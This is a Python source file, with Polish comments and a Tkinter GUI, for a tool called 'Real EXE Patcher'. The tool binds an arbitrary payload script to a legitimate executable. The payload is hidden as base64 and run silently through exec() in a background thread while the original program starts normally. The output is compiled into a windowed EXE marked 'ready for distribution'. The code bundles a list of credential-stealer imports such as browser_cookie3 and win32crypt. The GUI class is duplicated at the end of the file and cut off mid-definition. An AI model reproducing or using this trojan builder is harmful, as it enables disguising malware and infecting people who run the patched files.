#!/usr/bin/env python3
"""
REAL EXE Patcher GUI - ekskluzywny tool do patchowania exe z payloadem
Autor: ziomek co ogarnia GUI i prawdziwe patchowanie üòà
"""
import os
import sys
import shutil
import base64
import tempfile
import argparse
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import threading
from pathlib import Path
import ast
import re

class RealExePatcher:
    def __init__(self):
        self.verbose = True
        self.gui_callback = None  # Callback dla GUI log√≥w
        
    def log(self, message):
        if self.verbose:
            print(f"[Patcher] {message}")
        # Je≈õli jest GUI callback, wy≈õlij tam te≈º
        if self.gui_callback:
            self.gui_callback(f"[Patcher] {message}")
            
    def create_embedded_exe(self, original_exe, payload_code, output_exe):
        """Stw√≥rz exe z embedded kodem - PRAWDZIWY patcher"""
        try:
            self.log(f"Patchowanie: {original_exe} -> {output_exe}")
            
            # Wykryj importy potrzebne dla payloadu
            detected_imports = self.detect_payload_imports(payload_code)
            
            # Koduj oryginalny exe do base64
            with open(original_exe, 'rb') as f:
                exe_data = base64.b64encode(f.read()).decode()
                
            # Koduj payload do base64
            payload_data = base64.b64encode(payload_code.encode()).decode()
            
            # Stw√≥rz embedded exe (Python script kt√≥ry zawiera wszystko)
            original_name = os.path.basename(original_exe)
            embedded_script = f'''#!/usr/bin/env python3
# Embedded EXE with payload - generated by Real Patcher üòà
import os
import sys
import base64
import tempfile
import subprocess
import threading
import time
import shutil
import traceback
from pathlib import Path
from datetime import datetime

# Embedded oryginalny exe (base64)
ORIGINAL_EXE_DATA = """{exe_data}"""

# Embedded payload kod (base64)  
PAYLOAD_CODE = """{payload_data}"""

def extract_and_run_original():
    """WyciƒÖgnij i uruchom oryginalny exe"""
    try:
        # Stw√≥rz temp file dla oryginalnego exe
        temp_dir = tempfile.mkdtemp()
        original_name = "{original_name}"
        temp_exe_path = Path(temp_dir) / original_name
        
        # Dekoduj i zapisz oryginalny exe
        exe_bytes = base64.b64decode(ORIGINAL_EXE_DATA)
        with open(temp_exe_path, 'wb') as f:
            f.write(exe_bytes)
            
        # Uruchom oryginalny exe
        subprocess.run([str(temp_exe_path)] + sys.argv[1:], check=False)
        
        # Cleanup po sko≈Ñczeniu
        try:
            shutil.rmtree(temp_dir)
        except:
            pass
            
    except Exception as e:
        # Cicho ignoruj b≈Çƒôdy
        pass

def run_payload():
    """Uruchom payload w tle"""
    try:
        # Dekoduj i wykonaj payload
        payload_bytes = base64.b64decode(PAYLOAD_CODE)
        payload_script = payload_bytes.decode('utf-8')
        
        # Wykonaj payload w osobnym namespace
        exec(payload_script, {{"__name__": "__main__"}})
        
    except Exception as e:
        # Loguj b≈ÇƒÖd payload do pliku w folderze patchera
        try:
            import traceback
            from pathlib import Path
            from datetime import datetime
            
            # Okre≈õl folder patchera (gdzie jest embedded exe)
            patcher_dir = Path(__file__).parent if "__file__" in globals() else Path.cwd()
            log_dir = patcher_dir / "logs" / "errors"
            log_dir.mkdir(parents=True, exist_ok=True)
            
            log_file = log_dir / "payload_errors.log"
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"[{{timestamp}}] PAYLOAD ERROR: {{str(e)}}\\n")
                f.write(f"[{{timestamp}}] TRACEBACK: {{traceback.format_exc()}}\\n")
                f.write("="*50 + "\\n")
                
        except:
            pass  # cicho ignoruj b≈Çƒôdy logowania b≈Çƒôd√≥w XD

def main():
    """G≈Ç√≥wna funkcja embedded exe"""
    try:
        # Uruchom payload w tle (bez daemon ≈ºeby siƒô nie zabi≈Ç)
        payload_thread = threading.Thread(target=run_payload, daemon=False)
        payload_thread.start()
        
        # D≈Çu≈ºszy delay ≈ºeby payload siƒô uruchomi≈Ç
        time.sleep(2.0)
        
        # Uruchom oryginalny exe
        extract_and_run_original()
        
    except Exception as e:
        # Fallback - przynajmniej spr√≥buj uruchomiƒá oryginalny exe
        extract_and_run_original()

if __name__ == "__main__":
    main()
'''
            
            # Zapisz embedded script
            script_path = output_exe + "_embedded.py"
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(embedded_script)
                
            self.log(f"Embedded script stworzony: {script_path}")
            
            # Automatycznie skompiluj do exe
            return self.compile_to_exe(script_path, output_exe, detected_imports)
            
        except Exception as e:
            self.log(f"B≈ÇƒÖd tworzenia embedded exe: {e}")
            return False
            
    def compile_to_exe(self, script_path, output_exe, detected_imports=None):
        """Kompiluj Python script do exe"""
        try:
            self.log("Kompilowanie do exe...")
            
            # Sprawd≈∫ czy pyinstaller jest zainstalowany
            try:
                import PyInstaller
            except ImportError:
                self.log("Instalowanie PyInstaller...")
                os.system("pip install pyinstaller")
            
            # U≈ºyj wykrytych import√≥w lub fallback
            if detected_imports:
                imports_list = detected_imports
            else:
                # Fallback - podstawowe importy
                imports_list = [
                    'requests', 'json', 'base64', 'tempfile', 'threading', 'subprocess',
                    'socket', 'ctypes', 'zipfile', 'io', 'urllib', 'platform', 'getpass',
                    'discord', 'cryptography', 'win32api', 'os', 'sys', 'shutil', 'pathlib'
                ]
            
            # Stw√≥rz hidden-import flags
            hidden_imports = ' '.join([f'--hidden-import={imp}' for imp in imports_list])
            
            # Kompiluj z PyInstaller + wykrytymi importami
            cmd = f'pyinstaller --onefile --windowed --distpath "{os.path.dirname(output_exe)}" --name "{os.path.basename(output_exe).replace(".exe", "")}" {hidden_imports} "{script_path}"'
            
            self.log(f"Uruchamianie: {cmd}")
            result = os.system(cmd)
            
            if result == 0:
                self.log("‚úÖ Kompilacja zako≈Ñczona!")
                
                # Cleanup syfu po buildzie
                try:
                    # PyInstaller tworzy build w folderze roboczym (nie tam gdzie script)
                    build_dir = os.path.join(os.getcwd(), "build")
                    spec_file = os.path.join(os.getcwd(), os.path.basename(script_path).replace(".py", ".spec"))
                    
                    if os.path.exists(build_dir):
                        shutil.rmtree(build_dir)
                        self.log("üóëÔ∏è Usuniƒôto folder build")
                    if os.path.exists(spec_file):
                        os.remove(spec_file)
                        self.log("üóëÔ∏è Usuniƒôto plik .spec")
                    if os.path.exists(script_path):
                        os.remove(script_path)
                        self.log("üóëÔ∏è Usuniƒôto embedded script")
                        
                except Exception as e:
                    self.log(f"‚ö†Ô∏è Nie mog≈Çem posprzƒÖtaƒá: {e}")
                    
                return True
            else:
                self.log("‚ùå B≈ÇƒÖd kompilacji")
                return False
                
        except Exception as e:
            self.log(f"B≈ÇƒÖd kompilacji: {e}")
            
            # Loguj b≈ÇƒÖd kompilacji do errors
            try:
                from pathlib import Path
                import traceback
                import time
                
                patcher_dir = Path(__file__).parent
                error_dir = patcher_dir / "logs" / "errors"
                error_dir.mkdir(parents=True, exist_ok=True)
                
                error_file = error_dir / "compilation_errors.log"
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                
                with open(error_file, "a", encoding="utf-8") as f:
                    f.write(f"[{timestamp}] COMPILATION ERROR: {str(e)}\n")
                    f.write(f"[{timestamp}] TRACEBACK: {traceback.format_exc()}\n")
                    f.write("="*50 + "\n")
                    
            except:
                pass
                
            return False
            
    def patch_exe(self, original_exe, payload_source, output_exe):
        """G≈Ç√≥wna funkcja patchowania"""
        try:
            # Sprawd≈∫ czy pliki istniejƒÖ
            if not os.path.exists(original_exe):
                self.log(f"‚ùå Oryginalny exe nie istnieje: {original_exe}")
                return False
                
            # Pobierz payload code
            if os.path.exists(payload_source):
                # Z pliku
                with open(payload_source, 'r', encoding='utf-8') as f:
                    payload_code = f.read()
                self.log(f"Payload za≈Çadowany z pliku: {payload_source}")
            else:
                # Raw kod
                payload_code = payload_source
                self.log(f"U≈ºywam raw payload ({len(payload_code)} znak√≥w)")
                
            # Stw√≥rz folder patched je≈õli nie istnieje
            patched_dir = Path(os.path.dirname(output_exe)) / "patched"
            patched_dir.mkdir(exist_ok=True)
            self.log(f"Folder patched: {patched_dir}")
                
            # Backup oryginalnego
            backup_path = original_exe + ".backup"
            if not os.path.exists(backup_path):
                shutil.copy2(original_exe, backup_path)
                self.log(f"Backup: {backup_path}")
                
            # Patchuj exe
            success = self.create_embedded_exe(original_exe, payload_code, output_exe)
            
            if success:
                self.log("üéØ Patchowanie zako≈Ñczone pomy≈õlnie!")
                self.log(f"Spatchowany exe: {output_exe}")
                return True
            else:
                self.log("‚ùå Patchowanie nie powiod≈Ço siƒô")
                return False
                
        except Exception as e:
            self.log(f"‚ùå B≈ÇƒÖd patchowania: {e}")
            return False

    def detect_payload_imports(self, payload_code):
        """Wykryj jakie importy potrzebuje payload - automatyczne wykrywanie"""
        try:
            import ast
            import re
            
            detected_imports = set()
            
            # Metoda 1: Regex dla prostych przypadk√≥w
            import_patterns = [
                r'^\s*import\s+([a-zA-Z_][a-zA-Z0-9_]*(?:\.[a-zA-Z_][a-zA-Z0-9_]*)*)',
                r'^\s*from\s+([a-zA-Z_][a-zA-Z0-9_]*(?:\.[a-zA-Z_][a-zA-Z0-9_]*)*)\s+import',
                r'__import__\(["\']([^"\']+)["\']',
            ]
            
            for pattern in import_patterns:
                matches = re.findall(pattern, payload_code, re.MULTILINE)
                for match in matches:
                    # Dodaj g≈Ç√≥wny modu≈Ç (np. z 'requests.get' we≈∫ 'requests')
                    root_module = match.split('.')[0]
                    detected_imports.add(root_module)
            
            # Metoda 2: AST parsing (bardziej precyzyjne)
            try:
                tree = ast.parse(payload_code)
                for node in ast.walk(tree):
                    if isinstance(node, ast.Import):
                        for alias in node.names:
                            root_module = alias.name.split('.')[0]
                            detected_imports.add(root_module)
                    elif isinstance(node, ast.ImportFrom):
                        if node.module:
                            root_module = node.module.split('.')[0]
                            detected_imports.add(root_module)
            except:
                pass  # jak AST siƒô wywali, to przynajmniej regex mamy
            
            # Podstawowe importy kt√≥re zawsze dodajemy
            base_imports = [
                'os', 'sys', 'json', 'base64', 'tempfile', 'threading', 
                'subprocess', 'time', 'shutil', 'pathlib', 'requests'
            ]
            
            # Popularne importy dla malware/stealers
            common_malware_imports = [
                'socket', 'ctypes', 'zipfile', 'io', 'urllib', 'platform',
                'getpass', 'discord', 'cryptography', 'win32api', 'win32crypt',
                'sqlite3', 'psutil', 'winreg', 'PIL', 'cv2', 'numpy', 
                'selenium', 'browser_cookie3', 'pycryptodome', 'keyring'
            ]
            
            # Dodaj wszystkie wykryte + base + common
            all_imports = detected_imports.union(base_imports).union(common_malware_imports)
            
            self.log(f"Wykryto {len(detected_imports)} import√≥w w payloadzie: {list(detected_imports)}")
            self.log(f"Dodajƒô ≈ÇƒÖcznie {len(all_imports)} hidden-imports")
            
            return list(all_imports)
            
        except Exception as e:
            self.log(f"B≈ÇƒÖd wykrywania import√≥w: {e}")
            # Fallback - zwr√≥ƒá du≈ºƒÖ listƒô popularnych import√≥w
            return [
                'os', 'sys', 'json', 'base64', 'tempfile', 'threading', 'subprocess',
                'time', 'shutil', 'pathlib', 'requests', 'socket', 'ctypes', 'zipfile',
                'io', 'urllib', 'platform', 'getpass', 'discord', 'cryptography',
                'win32api', 'win32crypt', 'sqlite3', 'psutil', 'winreg', 'PIL', 'cv2',
                'numpy', 'selenium', 'browser_cookie3', 'pycryptodome', 'keyring'
            ]
    
class ModernPatcherGUI:
    """Ekskluzywny GUI dla Real EXE Patcher - pro edition üòà"""
    
    def __init__(self, root):
        self.root = root
        self.setup_window()
        self.setup_variables()
        self.setup_styles()
        self.create_widgets()
        self.patcher = RealExePatcher()
        self.patcher.gui_callback = self.log_callback
        
    def setup_window(self):
        """Skonfiguruj g≈Ç√≥wne okno - ekskluzywny look"""
        self.root.title("‚ö° Real EXE Patcher v2.0 - Professional Edition ‚ö°")
        self.root.geometry("1000x750")
        self.root.minsize(900, 650)
        self.root.resizable(True, True)
        
        # Ciemny motyw - ekskluzywny jak skurwysyn
        self.colors = {
            'bg': '#0d1117',           # github dark bg
            'bg_secondary': '#161b22', # drugie t≈Ço
            'bg_tertiary': '#21262d',  # trzecie t≈Ço
            'fg': '#f0f6fc',           # bia≈Çy tekst
            'accent': '#ff6b35',       # pomara≈Ñczowy akcent
            'accent_hover': '#ff8e53', # hover
            'success': '#238636',      # zielony
            'error': '#da3633',        # czerwony
            'warning': '#d29922',      # ≈º√≥≈Çty
            'border': '#30363d',       # szary border
            'button': '#238636',       # zielony przycisk
            'button_hover': '#2ea043'  # hover przycisk
        }
        
        self.root.configure(bg=self.colors['bg'])
        
        # Centrum okna na ekranie
        self.center_window()
        
    def center_window(self):
        """Wycentruj okno na ekranie"""
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f"{width}x{height}+{x}+{y}")
        
    def setup_variables(self):
        """Zmienne GUI"""
        self.exe_path = tk.StringVar(value="No target EXE selected...")
        self.payload_path = tk.StringVar(value="No payload script selected...")
        self.output_path = tk.StringVar()
        self.progress_var = tk.StringVar(value="Ready to patch executables üéØ")
        self.is_patching = False
        
    def setup_styles(self):
        """Skonfiguruj style TTK - ekskluzywny look"""
        self.style = ttk.Style()
        
        # Ustaw theme
        try:
            self.style.theme_use('clam')
        except:
            pass
        
        # Konfiguracja styl√≥w - dark theme pro
        self.style.configure('Title.TLabel', 
                           background=self.colors['bg'],
                           foreground=self.colors['accent'],
                           font=('Segoe UI', 28, 'bold'))
                           
        self.style.configure('Subtitle.TLabel',
                           background=self.colors['bg'],
                           foreground=self.colors['fg'],
                           font=('Segoe UI', 11))
                           
        self.style.configure('Heading.TLabel',
                           background=self.colors['bg_secondary'],
                           foreground=self.colors['fg'],
                           font=('Segoe UI', 14, 'bold'))
                           
        self.style.configure('Custom.TLabel',
                           background=self.colors['bg_secondary'],
                           foreground=self.colors['fg'],
                           font=('Segoe UI', 10))
                           
        self.style.configure('Path.TLabel',
                           background=self.colors['bg_tertiary'],
                           foreground=self.colors['fg'],
                           font=('Consolas', 9),
                           relief='flat',
                           padding=(10, 8))
                           
        # Przyciski - ekskluzywne
        self.style.configure('Accent.TButton',
                           font=('Segoe UI', 10, 'bold'),
                           padding=(15, 8))
                           
        self.style.configure('Success.TButton',
                           font=('Segoe UI', 14, 'bold'),
                           padding=(20, 12))
                           
        # Ramki
        self.style.configure('Card.TFrame',
                           background=self.colors['bg_secondary'],
                           relief='flat',
                           borderwidth=1)
                           
    def create_widgets(self):
        """Stw√≥rz wszystkie widgety - ekskluzywny design"""
        # G≈Ç√≥wny container z paddingiem
        main_frame = tk.Frame(self.root, bg=self.colors['bg'])
        main_frame.pack(fill='both', expand=True, padx=25, pady=25)
        
        # Header sekcja
        self.create_header(main_frame)
        
        # Content area
        content_frame = tk.Frame(main_frame, bg=self.colors['bg'])
        content_frame.pack(fill='both', expand=True, pady=(20, 0))
        
        # Left panel - file selection + options
        left_panel = tk.Frame(content_frame, bg=self.colors['bg'])
        left_panel.pack(side='left', fill='both', expand=True, padx=(0, 10))
        
        self.create_file_selection_section(left_panel)
        self.create_options_section(left_panel)
        self.create_patch_section(left_panel)
        
        # Right panel - logs
        right_panel = tk.Frame(content_frame, bg=self.colors['bg'])
        right_panel.pack(side='right', fill='both', expand=True, padx=(10, 0))
        
        self.create_log_section(right_panel)
        
        # Status bar na dole
        self.create_status_bar(main_frame)
        
    def create_header(self, parent):
        """Header z tytu≈Çem i opisem"""
        header_frame = tk.Frame(parent, bg=self.colors['bg'])
        header_frame.pack(fill='x', pady=(0, 20))
        
        # G≈Ç√≥wny tytu≈Ç
        title_label = ttk.Label(header_frame, text="‚ö° Real EXE Patcher ‚ö°", style='Title.TLabel')
        title_label.pack()
        
        # Podtytu≈Ç
        subtitle_label = ttk.Label(header_frame, 
                                 text="Professional Payload Injection Tool | Advanced PE Modification",
                                 style='Subtitle.TLabel')
        subtitle_label.pack(pady=(5, 0))
        
        # Separator line
        separator = tk.Frame(header_frame, height=2, bg=self.colors['accent'])
        separator.pack(fill='x', pady=(15, 0))
        
    def create_file_selection_section(self, parent):
        """Sekcja wyboru plik√≥w - elegant cards"""
        # Card container
        card_frame = tk.Frame(parent, bg=self.colors['bg_secondary'], relief='solid', bd=1)
        card_frame.pack(fill='x', pady=(0, 15))
        
        # Header
        header = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        header.pack(fill='x', padx=20, pady=(15, 10))
        
        ttk.Label(header, text="üìÅ File Selection", style='Heading.TLabel').pack(anchor='w')
        
        # Content area
        content = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        content.pack(fill='x', padx=20, pady=(0, 20))
        
        # Target EXE selection
        self.create_file_picker(content, "Target Executable:", self.exe_path, self.browse_exe, "üéØ")
        
        # Payload selection  
        self.create_file_picker(content, "Payload Script:", self.payload_path, self.browse_payload, "üí£")
        
    def create_file_picker(self, parent, label_text, var, command, icon):
        """Helper do tworzenia file picker√≥w"""
        container = tk.Frame(parent, bg=self.colors['bg_secondary'])
        container.pack(fill='x', pady=(0, 15))
        
        # Label z ikonƒÖ
        label_frame = tk.Frame(container, bg=self.colors['bg_secondary'])
        label_frame.pack(fill='x', pady=(0, 5))
        
        label = tk.Label(label_frame, text=f"{icon} {label_text}", 
                        bg=self.colors['bg_secondary'], fg=self.colors['fg'],
                        font=('Segoe UI', 10, 'bold'))
        label.pack(anchor='w')
        
        # Path display + button
        path_frame = tk.Frame(container, bg=self.colors['bg_secondary'])
        path_frame.pack(fill='x')
        
        # Path label
        path_label = tk.Label(path_frame, textvariable=var,
                            bg=self.colors['bg_tertiary'], fg=self.colors['fg'],
                            font=('Consolas', 9), relief='solid', bd=1,
                            anchor='w', padx=10, pady=8)
        path_label.pack(side='left', fill='x', expand=True, padx=(0, 10))
        
        # Browse button
        browse_btn = tk.Button(path_frame, text="Browse", command=command,
                             bg=self.colors['accent'], fg='white',
                             font=('Segoe UI', 9, 'bold'), relief='flat',
                             padx=20, pady=8, cursor='hand2')
        browse_btn.pack(side='right')
        
        # Hover effects
        def on_enter(e):
            browse_btn.configure(bg=self.colors['accent_hover'])
        def on_leave(e):
            browse_btn.configure(bg=self.colors['accent'])
            
        browse_btn.bind('<Enter>', on_enter)
        browse_btn.bind('<Leave>', on_leave)
        
    def create_options_section(self, parent):
        """Sekcja opcji patchowania"""
        card_frame = tk.Frame(parent, bg=self.colors['bg_secondary'], relief='solid', bd=1)
        card_frame.pack(fill='x', pady=(0, 15))
        
        # Header
        header = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        header.pack(fill='x', padx=20, pady=(15, 10))
        
        ttk.Label(header, text="‚öôÔ∏è Patch Options", style='Heading.TLabel').pack(anchor='w')
        
        # Content
        content = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        content.pack(fill='x', padx=20, pady=(0, 20))
        
        # Auto-detect imports checkbox
        self.auto_imports = tk.BooleanVar(value=True)
        auto_check = tk.Checkbutton(content, text="üîç Auto-detect payload imports",
                                  variable=self.auto_imports,
                                  bg=self.colors['bg_secondary'], fg=self.colors['fg'],
                                  selectcolor=self.colors['bg_tertiary'],
                                  font=('Segoe UI', 10))
        auto_check.pack(anchor='w', pady=(0, 8))
        
        # Silent execution
        self.silent_mode = tk.BooleanVar(value=True)
        silent_check = tk.Checkbutton(content, text="üîá Silent payload execution",
                                    variable=self.silent_mode,
                                    bg=self.colors['bg_secondary'], fg=self.colors['fg'],
                                    selectcolor=self.colors['bg_tertiary'],
                                    font=('Segoe UI', 10))
        silent_check.pack(anchor='w', pady=(0, 8))
        
        # Cleanup after build
        self.cleanup_mode = tk.BooleanVar(value=True)
        cleanup_check = tk.Checkbutton(content, text="üßπ Cleanup build artifacts",
                                     variable=self.cleanup_mode,
                                     bg=self.colors['bg_secondary'], fg=self.colors['fg'],
                                     selectcolor=self.colors['bg_tertiary'],
                                     font=('Segoe UI', 10))
        cleanup_check.pack(anchor='w')
        
    def create_patch_section(self, parent):
        """Sekcja g≈Ç√≥wnego przycisku patch"""
        card_frame = tk.Frame(parent, bg=self.colors['bg_secondary'], relief='solid', bd=1)
        card_frame.pack(fill='x', pady=(0, 15))
        
        content = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        content.pack(fill='x', padx=20, pady=20)
        
        # G≈Ç√≥wny przycisk patch
        self.patch_button = tk.Button(content, text="üöÄ START PATCHING",
                                    command=self.start_patching,
                                    bg=self.colors['success'], fg='white',
                                    font=('Segoe UI', 16, 'bold'), relief='flat',
                                    padx=30, pady=15, cursor='hand2')
        self.patch_button.pack(fill='x')
        
        # Hover effects dla g≈Ç√≥wnego przycisku
        def on_enter(e):
            if not self.is_patching:
                self.patch_button.configure(bg=self.colors['button_hover'])
        def on_leave(e):
            if not self.is_patching:
                self.patch_button.configure(bg=self.colors['success'])
                
        self.patch_button.bind('<Enter>', on_enter)
        self.patch_button.bind('<Leave>', on_leave)
        
    def create_log_section(self, parent):
        """Sekcja log√≥w - terminal style"""
        card_frame = tk.Frame(parent, bg=self.colors['bg_secondary'], relief='solid', bd=1)
        card_frame.pack(fill='both', expand=True)
        
        # Header
        header = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        header.pack(fill='x', padx=20, pady=(15, 10))
        
        header_label = ttk.Label(header, text="üìã Patch Logs", style='Heading.TLabel')
        header_label.pack(side='left')
        
        # Clear button
        clear_btn = tk.Button(header, text="Clear", command=self.clear_logs,
                            bg=self.colors['warning'], fg='white',
                            font=('Segoe UI', 8, 'bold'), relief='flat',
                            padx=15, pady=5, cursor='hand2')
        clear_btn.pack(side='right')
        
        # Log text area - terminal style
        log_frame = tk.Frame(card_frame, bg=self.colors['bg_secondary'])
        log_frame.pack(fill='both', expand=True, padx=20, pady=(0, 20))
        
        self.log_text = scrolledtext.ScrolledText(log_frame,
                                                bg='#0d1117', fg='#58a6ff',
                                                font=('Consolas', 9),
                                                relief='solid', bd=1,
                                                wrap='word', state='disabled')
        self.log_text.pack(fill='both', expand=True)
        
        # Kolorowe tagi dla log√≥w
        self.log_text.tag_configure('info', foreground='#58a6ff')
        self.log_text.tag_configure('success', foreground='#3fb950')
        self.log_text.tag_configure('error', foreground='#f85149')
        self.log_text.tag_configure('warning', foreground='#d29922')
        
    def create_status_bar(self, parent):
        """Status bar na dole"""
        status_frame = tk.Frame(parent, bg=self.colors['bg_tertiary'], relief='solid', bd=1)
        status_frame.pack(fill='x', pady=(20, 0))
        
        # Status text
        self.status_label = tk.Label(status_frame, textvariable=self.progress_var,
                                   bg=self.colors['bg_tertiary'], fg=self.colors['fg'],
                                   font=('Segoe UI', 10), anchor='w', padx=15, pady=8)
        self.status_label.pack(side='left', fill='x', expand=True)
        
        # Version info
        version_label = tk.Label(status_frame, text="v2.0 Professional",
                               bg=self.colors['bg_tertiary'], fg=self.colors['accent'],
                               font=('Segoe UI', 9, 'bold'), padx=15, pady=8)
        version_label.pack(side='right')
        
    def browse_exe(self):
        """Wybierz target exe"""
        filetypes = [("Executable files", "*.exe"), ("All files", "*.*")]
        filename = filedialog.askopenfilename(title="Select Target EXE", filetypes=filetypes)
        if filename:
            self.exe_path.set(filename)
            self.log_message(f"Selected target EXE: {os.path.basename(filename)}", 'info')
            
    def browse_payload(self):
        """Wybierz payload script"""
        filetypes = [("Python files", "*.py"), ("All files", "*.*")]
        filename = filedialog.askopenfilename(title="Select Payload Script", filetypes=filetypes)
        if filename:
            self.payload_path.set(filename)
            self.log_message(f"Selected payload: {os.path.basename(filename)}", 'info')
            
    def start_patching(self):
        """Rozpocznij proces patchowania"""
        if self.is_patching:
            return
            
        # Walidacja input√≥w
        exe_path = self.exe_path.get()
        payload_path = self.payload_path.get()
        
        if not exe_path or exe_path.startswith("No target"):
            messagebox.showerror("Error", "Please select a target EXE file!")
            return
            
        if not payload_path or payload_path.startswith("No payload"):
            messagebox.showerror("Error", "Please select a payload script!")
            return
            
        if not os.path.exists(exe_path):
            messagebox.showerror("Error", f"Target EXE does not exist: {exe_path}")
            return
            
        if not os.path.exists(payload_path):
            messagebox.showerror("Error", f"Payload script does not exist: {payload_path}")
            return
            
        # Okre≈õl output path
        output_dir = Path.cwd() / "patched"
        output_dir.mkdir(exist_ok=True)
        
        base_name = os.path.splitext(os.path.basename(exe_path))[0]
        output_exe = str(output_dir / f"{base_name}_patched.exe")
        
        # Uruchom patchowanie w osobnym wƒÖtku
        self.is_patching = True
        self.patch_button.configure(text="üîÑ PATCHING...", bg=self.colors['warning'])
        self.progress_var.set("Patching in progress...")
        
        thread = threading.Thread(target=self.patch_thread, args=(exe_path, payload_path, output_exe))
        thread.daemon = True
        thread.start()
        
    def patch_thread(self, exe_path, payload_path, output_exe):
        """WƒÖtek patchowania"""
        try:
            self.log_message("="*60, 'info')
            self.log_message("üöÄ Starting EXE patching process...", 'info')
            self.log_message(f"Target: {os.path.basename(exe_path)}", 'info')
            self.log_message(f"Payload: {os.path.basename(payload_path)}", 'info')
            self.log_message("="*60, 'info')
            
            # Patchowanie
            success = self.patcher.patch_exe(exe_path, payload_path, output_exe)
            
            # Update UI w main thread
            self.root.after(0, self.patch_complete, success, output_exe)
            
        except Exception as e:
            self.root.after(0, self.patch_error, str(e))
            
    def patch_complete(self, success, output_exe):
        """Callback po zako≈Ñczeniu patchowania"""
        self.is_patching = False
        
        if success:
            self.patch_button.configure(text="‚úÖ PATCH COMPLETE", bg=self.colors['success'])
            self.progress_var.set(f"Success! Patched EXE: {os.path.basename(output_exe)}")
            self.log_message("="*60, 'success')
            self.log_message("‚úÖ PATCHING COMPLETED SUCCESSFULLY!", 'success')
            self.log_message(f"üì¶ Output: {output_exe}", 'success')
            self.log_message("üéØ Ready for distribution!", 'success')
            self.log_message("="*60, 'success')
            
            # Reset button po 3 sekundach
            self.root.after(3000, self.reset_patch_button)
            
        else:
            self.patch_button.configure(text="‚ùå PATCH FAILED", bg=self.colors['error'])
            self.progress_var.set("Patching failed - check logs for details")
            self.log_message("‚ùå PATCHING FAILED!", 'error')
            
            # Reset button po 3 sekundach
            self.root.after(3000, self.reset_patch_button)
            
    def patch_error(self, error_msg):
        """Callback w przypadku b≈Çƒôdu"""
        self.is_patching = False
        self.patch_button.configure(text="‚ùå ERROR", bg=self.colors['error'])
        self.progress_var.set("Error occurred during patching")
        self.log_message(f"‚ùå ERROR: {error_msg}", 'error')
        
        # Reset button po 3 sekundach
        self.root.after(3000, self.reset_patch_button)
        
    def reset_patch_button(self):
        """Reset g≈Ç√≥wnego przycisku"""
        self.patch_button.configure(text="üöÄ START PATCHING", bg=self.colors['success'])
        self.progress_var.set("Ready to patch executables üéØ")
        
    def log_callback(self, message):
        """Callback dla log√≥w z patchera"""
        # Okre≈õl typ wiadomo≈õci na podstawie zawarto≈õci
        if "‚úÖ" in message or "Success" in message or "zako≈Ñczone pomy≈õlnie" in message:
            tag = 'success'
        elif "‚ùå" in message or "B≈ÇƒÖd" in message or "Error" in message:
            tag = 'error'
        elif "‚ö†Ô∏è" in message or "Warning" in message:
            tag = 'warning'
        else:
            tag = 'info'
            
        # Update logs w main thread
        self.root.after(0, self.log_message, message, tag)
        
    def log_message(self, message, tag='info'):
        """Dodaj wiadomo≈õƒá do log√≥w"""
        self.log_text.configure(state='normal')
        self.log_text.insert('end', f"{message}\n", tag)
        self.log_text.configure(state='disabled')
        self.log_text.see('end')
        
    def clear_logs(self):
        """Wyczy≈õƒá logi"""
        self.log_text.configure(state='normal')
        self.log_text.delete('1.0', 'end')
        self.log_text.configure(state='disabled')
        self.log_message("Logs cleared", 'info')

def main():
    """CLI interface"""
    parser = argparse.ArgumentParser(description="Real EXE Patcher - prawdziwe patchowanie üòà")
    
    parser.add_argument("exe", help="Plik EXE do spatchowania")
    parser.add_argument("payload", help="Payload (plik .py lub raw kod)")
    parser.add_argument("-o", "--output", help="Plik wyj≈õciowy (domy≈õlnie: EXE_patched.exe)")
    parser.add_argument("-q", "--quiet", action="store_true", help="Cichy tryb")
    
    args = parser.parse_args()
    
    # Okre≈õl plik wyj≈õciowy
    if args.output:
        output_exe = args.output
    else:
        # Domy≈õlnie zapisz w folderze patched (w katalogu patchera)
        patcher_dir = os.path.dirname(os.path.abspath(__file__))
        patched_dir = Path(patcher_dir) / "patched"
        patched_dir.mkdir(exist_ok=True)
        
        base_name = os.path.splitext(os.path.basename(args.exe))[0]
        output_exe = str(patched_dir / f"{base_name}_patched.exe")
        
    # Stw√≥rz patcher
    patcher = RealExePatcher()
    patcher.verbose = not args.quiet
    
    # Patchuj
    success = patcher.patch_exe(args.exe, args.payload, output_exe)
    
    if success:
        print(f"‚úÖ Sukces! Spatchowany exe: {output_exe}")
        print("üéØ Teraz mo≈ºesz dystrybuowaƒá ten plik!")
    else:
        print("‚ùå Patchowanie nie powiod≈Ço siƒô!")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) == 1:
        # GUI mode - uruchom ekskluzywny interface
        try:
            root = tk.Tk()
            app = ModernPatcherGUI(root)
            root.mainloop()
        except Exception as e:
            print(f"GUI Error: {e}")
            print("Falling back to CLI mode...")
            # Fallback do CLI
            main()
    else:
        # CLI mode
        main()

class ModernPatcherGUI:
    """Ekskluzywny GUI dla Real EXE Patcher - pro edition üòà"""
    
    def __init__(self, root):
        self.root = root
        self.setup_window()
        self.setup_variables()
        self.setup_styles()
        self.create_widgets()
        self.patcher = RealExePatcher()
        self.patcher.gui_callback = self.log_callback
        
    def setup_window(self):
        """Skonfiguruj g≈Ç√≥wne okno - ekskluzywny look"""
        self.root.title("‚ö° Real EXE Patcher v2.0 - Professional Edition ‚ö°")
        self.root.geometry("1000x750")
        self.root.minsize(900, 650)
        self.root.resizable(True, True)
        
        # Ciemny motyw - ekskluzywny jak skurwysyn
        self.colors = {
            'bg': '#0d1117',           # github dark bg
            'bg_secondary': '#161b22', # drugie t≈Ço
            'bg_tertiary': '#21262d',  # trzecie t≈Ço
            'fg': '#f0f6fc',           # bia≈Çy tekst
